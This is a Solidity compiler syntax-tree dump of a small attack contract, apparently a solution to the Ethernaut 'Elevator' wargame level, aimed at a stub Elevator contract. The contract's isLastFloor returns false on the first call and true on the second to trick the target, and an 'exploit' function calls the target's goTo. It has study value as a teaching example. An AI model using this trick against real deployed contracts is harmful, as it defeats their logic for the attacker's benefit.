PragmaDirective
   Source: "pragma solidity >=0.4.22 <0.6.0;"
ContractDefinition "Building"
   Source: "interface Building {  \n    function isLastFloor(uint) payable external returns (bool);\n}"
  FunctionDefinition "isLastFloor" - public
     Source: "function isLastFloor(uint) payable external returns (bool);"
    ParameterList
       Source: "(uint)"
      VariableDeclaration ""
         Type: uint256
         Source: "uint"
        ElementaryTypeName uint
           Source: "uint"
    ParameterList
       Source: "(bool)"
      VariableDeclaration ""
         Type: bool
         Source: "bool"
        ElementaryTypeName bool
           Source: "bool"
ContractDefinition "ArichBuilding"
   Source: "contract ArichBuilding is Building {\n    uint public lastFloor = 66;\n    Elevator elevator;\n    address public caddress;\n    bool called = false;\n\n    constructor(address _target) public {\n        caddress = _target;\n        elevator = Elevator(_target);\n    }\n\n    function isLastFloor(uint _floor) payable public returns (bool)  {\n        bool retval = false;\n        if ((lastFloor == _floor) && (! called)) {\n            called = true;\n        }\n        else {\n            called = false;\n            retval = true;\n        }\n        return retval;\n    }\n\n    function exploit(uint fnumber) public returns(bool) {\n        elevator.goTo(fnumber);\n        return true;\n    }\n}"
  InheritanceSpecifier
     Source: "Building"
    UserDefinedTypeName "Building"
       Source: "Building"
  VariableDeclaration "lastFloor"
     Type: uint256
     Source: "uint public lastFloor = 66"
    ElementaryTypeName uint
       Source: "uint"
    Literal, token: [no token] value: 66
       Type: int_const 66
       Source: "66"
  VariableDeclaration "elevator"
     Type: contract Elevator
     Source: "Elevator elevator"
    UserDefinedTypeName "Elevator"
       Source: "Elevator"
  VariableDeclaration "caddress"
     Type: address
     Source: "address public caddress"
    ElementaryTypeName address
       Source: "address"
  VariableDeclaration "called"
     Type: bool
     Source: "bool called = false"
    ElementaryTypeName bool
       Source: "bool"
    Literal, token: false value: false
       Type: bool
       Source: "false"
  FunctionDefinition "" - public
     Source: "constructor(address _target) public {\n        caddress = _target;\n        elevator = Elevator(_target);\n    }"
    ParameterList
       Source: "(address _target)"
      VariableDeclaration "_target"
         Type: address
         Source: "address _target"
        ElementaryTypeName address
           Source: "address"
    ParameterList
       Source: ""
    Block
       Source: "{\n        caddress = _target;\n        elevator = Elevator(_target);\n    }"
      ExpressionStatement
         Source: "caddress = _target"
        Assignment using operator =
           Type: address
           Source: "caddress = _target"
          Identifier caddress
             Type: address
             Source: "caddress"
          Identifier _target
             Type: address
             Source: "_target"
      ExpressionStatement
         Source: "elevator = Elevator(_target)"
        Assignment using operator =
           Type: contract Elevator
           Source: "elevator = Elevator(_target)"
          Identifier elevator
             Type: contract Elevator
             Source: "elevator"
          FunctionCall
             Type: contract Elevator
             Source: "Elevator(_target)"
            Identifier Elevator
               Type: type(contract Elevator)
               Source: "Elevator"
            Identifier _target
               Type: address
               Source: "_target"
  FunctionDefinition "isLastFloor" - public
     Source: "function isLastFloor(uint _floor) payable public returns (bool)  {\n        bool retval = false;\n        if ((lastFloor == _floor) && (! called)) {\n            called = true;\n        }\n        else {\n            called = false;\n            retval = true;\n        }\n        return retval;\n    }"
    ParameterList
       Source: "(uint _floor)"
      VariableDeclaration "_floor"
         Type: uint256
         Source: "uint _floor"
        ElementaryTypeName uint
           Source: "uint"
    ParameterList
       Source: "(bool)"
      VariableDeclaration ""
         Type: bool
         Source: "bool"
        ElementaryTypeName bool
           Source: "bool"
    Block
       Source: "{\n        bool retval = false;\n        if ((lastFloor == _floor) && (! called)) {\n            called = true;\n        }\n        else {\n            called = false;\n            retval = true;\n        }\n        return retval;\n    }"
      VariableDeclarationStatement
         Source: "bool retval = false"
        VariableDeclaration "retval"
           Type: bool
           Source: "bool retval"
          ElementaryTypeName bool
             Source: "bool"
        Literal, token: false value: false
           Type: bool
           Source: "false"
      IfStatement
         Source: "if ((lastFloor == _floor) && (! called)) {\n            called = true;\n        }\n        else {\n            called = false;\n            retval = true;\n        }"
        BinaryOperation using operator &&
           Type: bool
           Source: "(lastFloor == _floor) && (! called)"
          TupleExpression
             Type: bool
             Source: "(lastFloor == _floor)"
            BinaryOperation using operator ==
               Type: bool
               Source: "lastFloor == _floor"
              Identifier lastFloor
                 Type: uint256
                 Source: "lastFloor"
              Identifier _floor
                 Type: uint256
                 Source: "_floor"
          TupleExpression
             Type: bool
             Source: "(! called)"
            UnaryOperation (prefix) !
               Type: bool
               Source: "! called"
              Identifier called
                 Type: bool
                 Source: "called"
        Block
           Source: "{\n            called = true;\n        }"
          ExpressionStatement
             Source: "called = true"
            Assignment using operator =
               Type: bool
               Source: "called = true"
              Identifier called
                 Type: bool
                 Source: "called"
              Literal, token: true value: true
                 Type: bool
                 Source: "true"
        Block
           Source: "{\n            called = false;\n            retval = true;\n        }"
          ExpressionStatement
             Source: "called = false"
            Assignment using operator =
               Type: bool
               Source: "called = false"
              Identifier called
                 Type: bool
                 Source: "called"
              Literal, token: false value: false
                 Type: bool
                 Source: "false"
          ExpressionStatement
             Source: "retval = true"
            Assignment using operator =
               Type: bool
               Source: "retval = true"
              Identifier retval
                 Type: bool
                 Source: "retval"
              Literal, token: true value: true
                 Type: bool
                 Source: "true"
      Return
         Source: "return retval"
        Identifier retval
           Type: bool
           Source: "retval"
  FunctionDefinition "exploit" - public
     Source: "function exploit(uint fnumber) public returns(bool) {\n        elevator.goTo(fnumber);\n        return true;\n    }"
    ParameterList
       Source: "(uint fnumber)"
      VariableDeclaration "fnumber"
         Type: uint256
         Source: "uint fnumber"
        ElementaryTypeName uint
           Source: "uint"
    ParameterList
       Source: "(bool)"
      VariableDeclaration ""
         Type: bool
         Source: "bool"
        ElementaryTypeName bool
           Source: "bool"
    Block
       Source: "{\n        elevator.goTo(fnumber);\n        return true;\n    }"
      ExpressionStatement
         Source: "elevator.goTo(fnumber)"
        FunctionCall
           Type: tuple()
           Source: "elevator.goTo(fnumber)"
          MemberAccess to member goTo
             Type: function (uint256) external
             Source: "elevator.goTo"
            Identifier elevator
               Type: contract Elevator
               Source: "elevator"
          Identifier fnumber
             Type: uint256
             Source: "fnumber"
      Return
         Source: "return true"
        Literal, token: true value: true
           Type: bool
           Source: "true"
ContractDefinition "Elevator"
   Source: "contract Elevator {\n    function goTo(uint _floor) public { }\n}"
  FunctionDefinition "goTo" - public
     Source: "function goTo(uint _floor) public { }"
    ParameterList
       Source: "(uint _floor)"
      VariableDeclaration "_floor"
         Type: uint256
         Source: "uint _floor"
        ElementaryTypeName uint
           Source: "uint"
    ParameterList
       Source: ""
    Block
       Source: "{ }"
